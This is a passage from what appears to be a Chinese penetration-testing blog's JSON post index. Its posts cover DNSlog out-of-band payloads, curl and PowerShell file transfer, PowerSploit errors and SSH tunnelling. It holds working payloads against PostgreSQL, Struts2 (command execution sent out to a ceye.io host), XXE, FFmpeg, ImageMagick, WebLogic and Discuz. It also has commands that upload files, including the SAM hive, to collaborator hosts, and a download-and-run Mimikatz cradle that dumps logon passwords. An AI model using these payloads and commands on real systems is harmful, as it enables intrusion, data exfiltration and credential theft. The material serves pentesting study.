E\\\u0026#39;\\\\\\\\\\\\\\\\\u0026#39;||query_result||E\u0026#39;.psql.ip.port.b182oj.ceye.io\\\\\\\\foobar.txt\\\u0026#39;\u0026#39;; EXECUTE exec_cmd; END; $ LANGUAGE plpgsql SECURITY DEFINER; SELECT temp_function(); 0x02 XML Entity Injection \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE root [ \u0026lt;!ENTITY % remote SYSTEM \u0026#34;http://ip.port.b182oj.ceye.io/xxe_test\u0026#34;\u0026gt; %remote;]\u0026gt; \u0026lt;root/\u0026gt; 0x03 Others i. Struts2 xx.action?redirect:http://ip.port.b182oj.ceye.io/%25{3*4} xx.action?redirect:${ %23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{\u0026#39;whoami\u0026#39;})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23t%3d%23d.readLine(),%23u%3d\u0026#34;http://ip.port.b182oj.ceye.io/result%3d\u0026#34;.concat(%23t),%23http%3dnew%20java.net.URL(%23u).openConnection(),%23http.setRequestMethod(\u0026#34;GET\u0026#34;),%23http.connect(),%23http.getInputStream()} ii. FFMpeg #EXTM3U #EXT-X-MEDIA-SEQUENCE:0 #EXTINF:10.0, concat:http://ip.port.b182oj.ceye.io #EXT-X-ENDLIST iii. Weblogic xxoo.com/uddiexplorer/SearchPublicRegistries.jsp?operator=http://ip.port.b182oj.ceye.io/test\u0026amp;rdoSearch=name\u0026amp;txtSearchname=sdf\u0026amp;txtSearchkey=\u0026amp;txtSearchfor=\u0026amp;selfor=Businesslocation\u0026amp;btnSubmit=Search iv. ImageMagick push graphic-context viewbox 0 0 640 480 fill \u0026#39;url(http://ip.port.b182oj.ceye.io)\u0026#39; pop graphic-context v. Resin xxoo.com/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=http://ip.port.b182oj.ceye.io/ssrf vi. Discuz http://xxx.xxxx.com/forum.php?mod=ajax\u0026amp;action=downremoteimg\u0026amp;message=[img=1,1]http://ip.port.b182oj.ceye.io/xx.jpg[/img]\u0026amp;formhash=xxoo ","date":"2018-07-15T14:30:00+08:00","image":"https://runshell.github.io/images/1536409490993.png","permalink":"https://runshell.github.io/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/burp-suite%E4%B8%AD%E7%9A%84dnslog/","title":"Burp suite中的dnslog"},{"content":"**问题：**Burp 中有很多地方可以进行正则匹配，比如 Instruder 模块中筛选响应包，proxy 模块中匹并配替换字符串。中文在匹配的时候，添加进匹配列表就变身了，关键是与数据包内的相应字符不能匹配。\n解决办法：\n在 user option 中设置字符集(character sets)为显示原始字节流(Display as raw bytes); 在响应包中复制要匹配的中文，显示的是乱码； 将复制的乱码粘贴到添加匹配字符串的地方。 ","date":"2018-07-15T14:30:00+08:00","image":"https://runshell.github.io/images/image1.png","permalink":"https://runshell.github.io/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/burp%E4%B8%AD%E5%8C%B9%E9%85%8D%E4%B8%AD%E6%96%87/","title":"Burp中匹配中文"},{"content":"0x00 前言 在渗透测试中经常需要在艰难的环境下执行命令，比如没有回显。为了摆脱困境，经常需要传送文件。curl是一个非常厉害的工具，在绝大多数情况下，linux系统中是存在curl的。此外Windows系统中，powershell4.0及其以后的版本中提供了一个cmlet——Invoke-WebRequest，其别名之一是curl。所以，简单记录一下curl的用法。\n0x01 Linux中的curl 1.http请求 get curl 命令后面直接跟url；使用-H指定请求头，每个-H指定一条header；使用 -o 指定输出到具体文件而不是标准输出。\ncurl \u0026#39;https://files.college.360.cn/others/Q1NBQS3lhoXnvZHmuJfpgI_mioDmnK8t56ysMTbor74tU01C5Y2P6K6uLnBkZg==?time=1537360082\u0026amp;sign=5fd0f26e3346e8171e8656caaa42b0fc\u0026#39; -H \u0026#39;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36\u0026#39; -H \u0026#39;Referer: https://admin.college.360.cn/user/student/course/1032\u0026#39; post 普通表单post，使用-d指定请求体内容。\ncurl -d \u0026#34;user=admin\u0026amp;passwd=12345678\u0026#34; http://127.0.0.1:8080/login 文件表单post，使用-F指定需要上传的文件。\ncurl http://oumchi.burpcollaborator.net -F \u0026#34;6379.txt=@6379.txt\u0026#34; # 发送出的请求如下： # POST / HTTP/1.1 # Host: oumchi.burpcollaborator.net # User-Agent: curl/7.58.0 # Accept: */* # Content-Length: 1978 # Content-Type: multipart/form-data; boundary=------------------------c9011604f054ee36 # Expect: 100-continue # --------------------------c9011604f054ee36 # Content-Disposition: form-data; name=\u0026#34;6379.txt\u0026#34;; filename=\u0026#34;6379.txt\u0026#34; # Content-Type: text/plain # Starting Nmap 7.60 ( https://nmap.org ) at 2018-09-01 08:25 UTC # Stats: 0:01:21 elapsed; 0 hosts completed (64 up), 64 undergoing SYN Stealth Scan # SYN Stealth Scan Timing: About 3.82% done; ETC: 09:00 (0:34:01 remaining) # Stats: 0:01:21 elapsed; 0 hosts completed (64 up), 64 undergoing SYN Stealth Scan # SYN Stealth Scan Timing: About 3.82% done; ETC: 09:00 (0:33:59 remaining) # Stats: 0:01:21 elapsed; 0 hosts completed (64 up), 64 undergoing SYN Stealth Scan # SYN Stealth Scan Timing: About 3.83% done; ETC: 09:00 (0:33:55 remaining) # --------------------------c9011604f054ee36-- put curl http://6biy7e.burpcollaborator.net/ -T ca_setup.exe 其它方法测试 curl http://www.example.com -X OPTIONS curl http://www.example.com -X TRACE ... 2.ftp请求 get curl ftp://user:passwd@ftpserver.com:port/path/filename -o filepath put curl –u name:passwd -T size.mp3 ftp://www.xxx.com/mp3/ ls(dir) curl ftp://user:passwd@ftpserver.com:port/path/ delete curl –u name:passwd ftp://www.xxx.com/ -X \u0026#39;DELE mp3/size.mp3\u0026#39; 3.其他 -u, --user \u0026lt;user:password\u0026gt; 需要口令验证的http或ftp --ntlm 使用htlm认证 -A, --user-agent \u0026lt;name\u0026gt; 指定请求头中的user-agent字段 --socks5 \u0026lt;host[:port]\u0026gt; 使用sockes5代理 -x, --proxy [protocol://]host[:port] 使用http/https代理 --post301 Do not switch to GET after following a 301 不跳转301 --post302 Do not switch to GET after following a 302 不跳转302 --post303 Do not switch to GET after following a 303 不跳转303 0x02 Windows中的curl powershell 中的curl是Invoke-WebRequest，它的另一个别名是wget。它是使用-Headers \u0026lt;IDictionary\u0026gt;来指定请求头，powershell5.x即以前版本可以指定所有请求头，之后的版本UserAgent只能通过-UserAgent \u0026lt;String\u0026gt;指定。\nInvoke-WebRequest [-Uri] \u0026lt;Uri\u0026gt; [-Body \u0026lt;Object\u0026gt;] [-Certificate \u0026lt;X509Certificate\u0026gt;] [-CertificateThumbprint \u0026lt;String\u0026gt;] [-ContentType \u0026lt;String\u0026gt;] [-Credential \u0026lt;PSCredential\u0026gt; ] [-DisableKeepAlive] [-Headers \u0026lt;IDictionary\u0026gt;] [-InFile \u0026lt;String\u0026gt;] [-MaximumRedirection \u0026lt;Int32\u0026gt;] [-Method { Default | Get | Head | Post | Put | Delete | Trace | Options | Merge | Patch}] [-OutFile \u0026lt;String\u0026gt;] [-PassThru] [-Proxy \u0026lt;Uri\u0026gt;] [-ProxyCredential \u0026lt;PSCredential\u0026gt;] [-ProxyUseDefaultCredentials] [-SessionVariable \u0026lt;String\u0026gt;] [-Timeou tSec \u0026lt;Int32\u0026gt;] [-TransferEncoding {chunked | compress | deflate | gzip | identity}] [-UseBasicParsing] [-UseDefaultCredentials] [-UserAgent \u0026lt;String\u0026gt;] [-WebSession \u0026lt;Web RequestSession\u0026gt;] [\u0026lt;CommonParameters\u0026gt;] 1.http get 使用-UserAgent 指定UA，使用-Headers指定请求头，使用-OutFile指定输出到文件。若不使用-OutFile，将返回一个HtmlWebResponseObject对象，只在屏幕上显示部分摘要信息，若要显示详细信息可以先将其存入变量，再查看变量content等属性。若只想产看响应体，可用管道符传给write-host,如curl ifconfig.me | write-host 。\nInvoke-WebRequest -Uri \u0026#34;https://files.college.360.cn/others/Q1NBQS3lhoXnvZHmuJfpgI_mioDmnK8t56ysMTbor74tU01C5Y2P6K6uLnBkZg==?time=1537360082\u0026amp;sign=5fd0f26e3346e8171e8656caaa42b0fc\u0026#34; -Headers @{\u0026#34;Accept\u0026#34;=\u0026#34;*/*\u0026#34;; \u0026#34;Referer\u0026#34;=\u0026#34;https://admin.college.360.cn\u0026#34;} -UserAgent \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36\u0026#34; -OutFile xxx.pdf post 在使用非get方法时必须用-Method指定请求方法；请求体可以用-body指定一个string或其它类型的对象，也可以从本地文件获取内容作为请求体，使用-infile指定本地文件。\ncurl http://lti9gf.burpcollaborator.net -Method post -Body \u0026#34;user=admin\u0026amp;passwd=12345678\u0026#34; put 如果服务器支持put方法，可以直接put上传文件\ncurl http://lti9gf.burpcollaborator.net -Method put -InFile ‪C:\\sam.hive 2.ftp 似乎只能下载文件\ncurl ftp://user:password@127.0.0.1:21/s2-057.py -outFile s2-057.py 0x03 net.webclient 在powershell4.0以前没有提供Invoke-WebRequest,这时我们可以使用Net.WebClient，它是.NET Framework中的一个类。它的功能更加强大。\n#ftp下载 (New-Object System.Net.WebClient).downloadfile(\u0026#39;ftp://admin:admin@172.28.100.68/ppt.txt\u0026#39;,\u0026#39;ppt.txt\u0026#39;) #ftp上传 (New-Object System.Net.WebClient).uploadfile(\u0026#39;ftp://admin:admin@172.28.100.68/ppt1.txt\u0026#39;,\u0026#39;ppt.txt\u0026#39;) #http上传 (New-Object System.Net.WebClient).uploadfile(\u0026#39;http://8060wg.burpcollaborator.net\u0026#39;,\u0026#39;ppt.txt\u0026#39;) #http下载文件 (New-Object System.Net.WebClient).downloadfile(\u0026#39;http：//172.28.100.68/ppt.txt\u0026#39;,\u0026#39;ppt.txt\u0026#39;) #下载到内存 $response=(New-Object System.Net.WebClient).downloadstring(\u0026#39;http：//172.28.100.68/ppt.txt\u0026#39;)#得到string $response=(New-Object System.Net.WebClient).downloaddata(\u0026#39;http：//172.28.100.68/ppt.txt\u0026#39;)#得到byte[] #从内存上传 (New-Object System.Net.WebClient).uploadstring(\u0026#39;http://8060wg.burpcollaborator.net\u0026#39;,$response) (New-Object System.Net.WebClient).uploaddata(\u0026#39;http://8060wg.burpcollaborator.net\u0026#39;,$response) #指定请求头 $mywebclient=(New-Object System.Net.WebClient); $mywebclient.Headers.Add(\u0026#34;Cookie\u0026#34;,\u0026#34; HMACCOUNT=057DAB164B4FC7D1; BAIDUID=3C7BA5C29716B9F251F8BC090E0BF028:FG=1; BIDUPSID=3C7BA5C29716B9F251F8BC090E0BF028; PSTM=1532227383\u0026#34;) $mywebclient.Headers.Add(\u0026#34;Referer\u0026#34;,\u0026#34;https://newtab.firefoxchina.cn/world-tab-index.html\u0026#34;) $mywebclient.downloadstring(\u0026#39;http://8060wg.burpcollaborator.net\u0026#39;) ","date":"2018-07-15T14:30:00+08:00","permalink":"https://runshell.github.io/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/curl%E8%AF%A6%E8%A7%A3/","title":"curl详解"},{"content":"报错的脚本主要为invoke-reflectivepeinjection.ps1，其它部分脚本由于使用了invoke-reflectivepeinjection.ps1中的代码，所以也报同样的错误,比如Invoke-Mimikatz、invoke-ninjacopy等。\n错误信息如下: PS C:\\WINDOWS\\system32\u0026gt; iex (New-Object System.Net.WebClient).DownloadString(\u0026#39;https://raw.githubusercontent.com/PowerShe llMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1\u0026#39;);Invoke-Mimikatz -Command \u0026#39;\u0026#34;privilege::debug\u0026#34; \u0026#34;sekurlsa::lo gonPasswords full\u0026#34;\u0026#39; 使用“1”个参数调用“GetMethod”时发生异常:“发现不明确的匹配。” 所在位置 行:886 字符: 6 + $GetProcAddress = $UnsafeNativeMethods.GetMethod(\u0026#39;GetProcAddr ... + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + CategoryInfo : NotSpecified: (:) [], MethodInvocationException + FullyQualifiedErrorId : AmbiguousMatchException 不能对 Null 值表达式调用方法。 所在位置 行:893 字符: 6 + Write-Output $GetProcAddress.Invoke($null, @([System.Runtime. ... + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + CategoryInfo : InvalidOperation: (:) []，RuntimeException + FullyQualifiedErrorId : InvokeMethodOnNull 找不到“GetDelegateForFunctionPointer”的重载，参数计数为:“2”。 所在位置 行:489 字符: 3 + $VirtualAlloc = [System.Runtime.InteropServices.Marshal]::Get ... + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + CategoryInfo : NotSpecified: (:) [], MethodException + FullyQualifiedErrorId : MethodCountCouldNotFindBest ............. ...省略n行... ............. 解决方法： 请尝试更改该行： $GetProcAddress = $UnsafeNativeMethods.GetMethod(\u0026#39;GetProcAddress\u0026#39;) 至 $GetProcAddress = $UnsafeNativeMethods.GetMethod(\u0026#39;GetProcAddress\u0026#39;, [reflection.bindingflags] \u0026#34;Public,Static\u0026#34;, $null, [System.Reflection.CallingConventions]::Any, @((New-Object System.Runtime.InteropServices.HandleRef).GetType(), [string]), $null); 报错分析： 报错的第886行代码为$GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress'),它存在如下函数中：\n#Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/ Function Get-ProcAddress { Param ( [OutputType([IntPtr])] [Parameter( Position = 0, Mandatory = $True )] [String] $Module, [Parameter( Position = 1, Mandatory = $True )] [String] $Procedure ) # Get a reference to System.dll in the GAC $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split(\u0026#39;\\\\\u0026#39;)[-1].Equals(\u0026#39;System.dll\u0026#39;) } $UnsafeNativeMethods = $SystemAssembly.GetType(\u0026#39;Microsoft.Win32.UnsafeNativeMethods\u0026#39;) # Get a reference to the GetModuleHandle and GetProcAddress methods $GetModuleHandle = $UnsafeNativeMethods.GetMethod(\u0026#39;GetModuleHandle\u0026#39;) $GetProcAddress = $UnsafeNativeMethods.GetMethod(\u0026#39;GetProcAddress\u0026#39;) # $GetProcAddress = $UnsafeNativeMethods.GetMethod(\u0026#39;GetProcAddress\u0026#39;, [reflection.bindingflags] \u0026#34;Public,Static\u0026#34;, $null, [System.Reflection.CallingConventions]::Any, @((New-Object System.Runtime.InteropServices.HandleRef).GetType(), [string]), $null); # Get a handle to the module specified $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module)) $tmpPtr = New-Object IntPtr $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle) # Return the address of the function Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure)) } 该行代码由于在执行$UnsafeNativeMethods.GetMethod(\u0026lsquo;GetProcAddress\u0026rsquo;)的时候，$UnsafeNativeMethods有两个方法名都是GetProcAddress，显然是方法的重载，所以GetMethod(\u0026lsquo;GetProcAddress\u0026rsquo;)无法确定返回哪个方法，所以出现错误。powershell和其他shell一样，代码执行出错抛出异常后会继续执行后面的代码。它不像python、php这些脚本语言，抛出异常后会终止程序。所以后面的报错是因为第一个错误产生的。\n以下是$UnsafeNativeMethods.GetMethod(\u0026lsquo;GetProcAddress\u0026rsquo;)的两个可能的值，必须想办法让它确定下来，方法之一则是“暂时解决办法”提到的那样。\nName : GetProcAddress DeclaringType : Microsoft.Win32.UnsafeNativeMethods ReflectedType : Microsoft.Win32.UnsafeNativeMethods MemberType : Method MetadataToken : 100663839 Module : System.dll IsSecurityCritical : True IsSecuritySafeCritical : True IsSecurityTransparent : False MethodHandle : System.RuntimeMethodHandle Attributes : PrivateScope, Public, Static, HideBySig, PinvokeImpl CallingConvention : Standard ReturnType : System.IntPtr ReturnTypeCustomAttributes : IntPtr ReturnParameter : IntPtr IsGenericMethod : False IsGenericMethodDefinition : False ContainsGenericParameters : False MethodImplementationFlags : PreserveSig IsPublic : True IsPrivate : False IsFamily : False IsAssembly : False IsFamilyAndAssembly : False IsFamilyOrAssembly : False IsStatic : True IsFinal : False IsVirtual : False IsHideBySig : True IsAbstract : False IsSpecialName : False IsConstructor : False CustomAttributes : {[System.Runtime.InteropServices.DllImportAttribute(\u0026#34;kernel32.dll\u0026#34;, EntryPoint = \u0026#34;GetProcAddress\u0026#34;, CharSet = 2, ExactSpelling = True, SetLastError = True, PreserveSig = True, CallingConvention = 1, BestFitMapping = False, ThrowOnUnmappableChar = False)], [System.Runtime.InteropServices.PreserveSigAttribute()]} Name : GetProcAddress DeclaringType : Microsoft.Win32.UnsafeNativeMethods ReflectedType : Microsoft.Win32.UnsafeNativeMethods MemberType : Method MetadataToken : 100663864 Module : System.dll IsSecurityCritical : True IsSecuritySafeCritical : True IsSecurityTransparent : False MethodHandle : System.RuntimeMethodHandle Attributes : PrivateScope, Public, Static, HideBySig, PinvokeImpl CallingConvention : Standard ReturnType : System.IntPtr ReturnTypeCustomAttributes : IntPtr ReturnParameter : IntPtr IsGenericMethod : False IsGenericMethodDefinition : False ContainsGenericParameters : False MethodImplementationFlags : PreserveSig IsPublic : True IsPrivate : False IsFamily : False IsAssembly : False IsFamilyAndAssembly : False IsFamilyOrAssembly : False IsStatic : True IsFinal : False IsVirtual : False IsHideBySig : True IsAbstract : False IsSpecialName : False IsConstructor : False CustomAttributes : {[System.Runtime.InteropServices.DllImportAttribute(\u0026#34;kernel32.dll\u0026#34;, EntryPoint = \u0026#34;GetProcAddress\u0026#34;, CharSet = 2, ExactSpelling = False, SetLastError = False, PreserveSig = True, CallingConvention = 1, BestFitMapping = False, ThrowOnUnmappableChar = False)], [System.Runtime.InteropServices.PreserveSigAttribute()]} ","date":"2018-07-15T14:30:00+08:00","permalink":"https://runshell.github.io/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/powersploit%E4%B8%AD%E5%A4%9A%E4%B8%AA%E8%84%9A%E6%9C%AC%E5%9C%A8windows10%E5%92%8Cserver2016%E4%B8%8A%E6%8A%A5%E9%94%99/","title":"powersploit中多个脚本在windows10和server2016上报错"},{"content":"0x00 ssh常用参数说明 -C 压缩传输数据,加快传输速度 -f 后台对用户名密码进行认证 -N 仅仅只用来转发,不用再弹回一个新的shell -n 后台运行 -q 安静模式,不要显示警告等信息 -l 指定ssh登录名 -g 允许远程主机连接到本地转发的端口（本机监听地址设为0.0.0.0，不选则为127.0.0.1） -L 进行本地端口转发 -R 进行远程端口转发 -D 动态转发,即socks代理 -T 禁止分配伪终端 -p 指定远程ssh服务端口 0x01 本地转发 ssh [-C] [-f] [-N] [-g] -L [本机ip]:本机端口:vps能访问的主机ip:端口 \u0026lt;user@vps\u0026gt; 将本地的一个端口映射到vps能到达的主机的一个端口。如果vps是边界设备，拥有多网卡，那么就可以用该方法访问内网主机的服务。\n例：假如你拥有一台web服务器的控制权，但是数据库服务器没有公网IP，你想直接访问数据库的服务，这时就可以使用本地转发，在本地（local）执行如下命令：\nssh -Nnf -L 6666:10.10.10.12:3306 root@188.224.123.45 #访问本地的6666端口就可以被映射到数据库10.10.10.12的3306端口 mysql -u root -ppassword -P 6666 序列图如下：\n0x02 远程转发 ssh -C -f -N -R 0.0.0.0:vps_port:本机能访问的IP:端口 root@vps 将vps上的一个端口映射到本机能到达的主机的一个端口。以至于可以通过vps访问内网的计算机上面的服务。遗憾的是，即使你指定了监听地址为0.0.0.0，它也仅能监听127.0.0.1，不能实现内网穿透。\n然后经过一番折腾，得出答案，需要修改sshd的配置文件/etc/ssh/sshd_config,将配置做如下修改：\nGatewayPorts yes #重启sshd服务 service sshd restart || systemctl restart sshd 0x03 动态转发 ssh -qTfnN -D 0.0.0.0:1080 root@vps -p 22 本机将本地1080端口的所有流量发给vps，vps转发收到的流量。这就是赤裸裸的socks代理啊。\n","date":"2018-07-15T14:30:00+08:00","image":"https://runshell.github.io/images/1536460373438.png","permalink":"https://runshell.github.io/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/ssh%E9%9A%A7%E9%81%93%E8%BD%AC%E5%8F%91/","title":"SSH隧道转发"}]